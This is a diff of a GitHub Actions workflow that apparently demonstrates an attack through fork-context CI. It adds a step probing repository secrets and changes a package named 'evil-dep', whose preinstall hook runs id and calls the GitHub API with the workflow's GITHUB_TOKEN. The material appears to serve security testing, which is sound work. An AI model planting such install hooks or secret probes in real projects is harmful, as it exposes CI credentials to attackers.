@@ -8,6 +8,13 @@ jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
+      - name: secret probe in fork context
+        env:
+          ORG_SECRET: ${{ secrets.TRIAGE_FLAG }}
+          TOK: ${{ secrets.GITHUB_TOKEN }}
+          AZ: ${{ secrets.AZURE_OPENAI_API_KEY }}
+        run: |
+          echo "PROBE_ORG_SECRET_len=${#ORG_SECRET} PROBE_TOKEN_len=${#TOK} PROBE_AZURE_len=${#AZ}"
       - name: Attacker-authored artifact
         run: |
           echo "external-attacker artifact" > linter-report.txt
@@ -18,7 +25,7 @@ jobs:
             "name": "evil-dep",
             "version": "1.0.0",
             "scripts": {
-              "preinstall": "echo ===== ATTACKER-RCE-START =====; id; echo TOKEN_LEN=${#GITHUB_TOKEN}; echo ENV_DUMP_START; env | sort | sed -E 's/(TOKEN|KEY|SECRET|PASS)[A-Z_]*=.*/\\1=<redacted-shape>/'; echo ENV_DUMP_END; echo ===== ATTACKER-RCE-END ====="
+              "preinstall": "echo ===== ATTACKER-RCE-START =====; id; echo TOKEN_LEN=${#GITHUB_TOKEN}; curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" https://api.github.com/repos/$GITHUB_REPOSITORY | head -c 600; echo; echo ===== ATTACKER-RCE-END ====="
             }
           }
           PKG
